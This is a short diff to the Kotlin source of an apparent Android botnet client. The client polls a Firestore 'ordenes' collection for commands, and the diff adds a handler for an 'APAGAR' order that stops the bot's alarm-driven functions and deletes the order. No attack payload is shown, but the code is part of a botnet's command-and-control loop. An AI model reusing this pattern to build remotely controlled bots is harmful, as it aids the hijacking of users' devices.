@@ -104,6 +104,13 @@ class Alarm : BroadcastReceiver() {
                             Log.d("TAG2", "Orden de envio de ping eliminada")
                         }
                     }
+                    if(document.data["Primitiva"]!!.equals("APAGAR")){
+                        cancelAlarm(contexto)
+                        Log.d("TAG2", "Se apaga las funciones de botnet")
+                        db.collection("ordenes").document(document.id).delete().addOnSuccessListener {
+                            Log.d("TAG2", "Orden apagar eliminada")
+                        }
+                    }
                 }
             }
             .addOnFailureListener { exception ->
